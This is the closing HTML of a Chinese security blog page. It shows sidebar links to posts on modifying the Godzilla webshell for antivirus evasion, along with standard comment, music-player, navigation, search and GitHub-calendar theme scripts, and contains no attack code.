href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-6(jspx免杀)"/></a><div class="content"><a class="title" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)">哥斯拉二开从0到1-6(jspx免杀)</a><time datetime="2025-02-06T02:21:52.000Z" title="发表于 2025-02-06 10:21:52">2025-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-5(asmx免杀)"/></a><div class="content"><a class="title" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)">哥斯拉二开从0到1-5(asmx免杀)</a><time datetime="2025-01-24T09:37:43.000Z" title="发表于 2025-01-24 17:37:43">2025-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-4(流量优化)"/></a><div class="content"><a class="title" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)">哥斯拉二开从0到1-4(流量优化)</a><time datetime="2025-01-22T01:53:00.000Z" title="发表于 2025-01-22 09:53:00">2025-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/" title="哥斯拉二开从0到1-3(动态密钥)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-3(动态密钥)"/></a><div class="content"><a class="title" href="/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/" title="哥斯拉二开从0到1-3(动态密钥)">哥斯拉二开从0到1-3(动态密钥)</a><time datetime="2024-12-24T05:38:47.000Z" title="发表于 2024-12-24 13:38:47">2024-12-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 <i id="heartbeat" class="fa fas fa-heartbeat"></i> By bohemian</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome to my <a href="https://bohemian.top/">blog</a>!</div></div><head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xindong2020/ButterflyEffects/footer/heart.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
  let initFn = window.walineFn || null
  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
  const option = null

  const destroyWaline = ele => ele.destroy()

  const initWaline = (Fn, el = document, path = window.location.pathname) => {
    const waline = Fn({
      el: el.querySelector('#waline-wrap'),
      serverURL: 'https://waline-git-main-bohemianas-projects.vercel.app/',
      pageview: false,
      dark: 'html[data-theme="dark"]',
      comment: false,
      ...option,
      path: isShuoshuo ? path : (option && option.path) || path
    })

    if (isShuoshuo) {
      window.shuoshuoComment.destroyWaline = () => {
        destroyWaline(waline)
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }
  }

  const loadWaline = (el, path) => {
    if (initFn) initWaline(initFn, el, path)
    else {
      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
        .then(({ init }) => {
          initFn = init || Waline.init
          initWaline(initFn, el, path)
          window.walineFn = initFn
        })
    }
  }

  if (isShuoshuo) {
    'Waline' === 'Waline'
      ? window.shuoshuoComment = { loadComment: loadWaline } 
      : window.loadOtherComment = loadWaline
    return
  }

  if ('Waline' === 'Waline' || !true) {
    if (true) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
    else setTimeout(loadWaline, 0)
  } else {
    window.loadOtherComment = loadWaline
  }
})()</script></div><div class="aplayer no-destroy" data-id="13186150757" data-server="netease" data-type="playlist" data-loop="all"  data-fixed="true" data-autoplay="true"> </div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: true,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      pjax.loadUrl('/404.html')
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/lite/builds/browser.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div></div><!-- hexo injector body_end start -->
  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
  <script data-pjax>
        function GithubCalendarConfig(){
            var git_githubapiurl ="https://githubcalendarapi.shiguang666.eu.org/api?user=Bohemiana";
            var git_color =['#ebedf0', '#f0fff4', '#dcffe4', '#bef5cb', '#85e89d', '#34d058', '#28a745', '#22863a', '#176f2c', '#165c26', '#144620'];
            var git_user ="Bohemiana";
            var parent_div_git = document.getElementById('recent-posts');
            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
            if(parent_div_git && location.pathname =='/'){
                console.log("已挂载hexo-github-calendar https://github.com/Barry-Flynn/hexo-github-calendar");
                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
            };
            GithubCalendar(git_githubapiurl,git_color,git_user)
        }
        if(document.getElementById('recent-posts')){
            GithubCalendarConfig()
        }
    </script>
    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
    <style></style><!-- hexo injector body_end end --></body></html>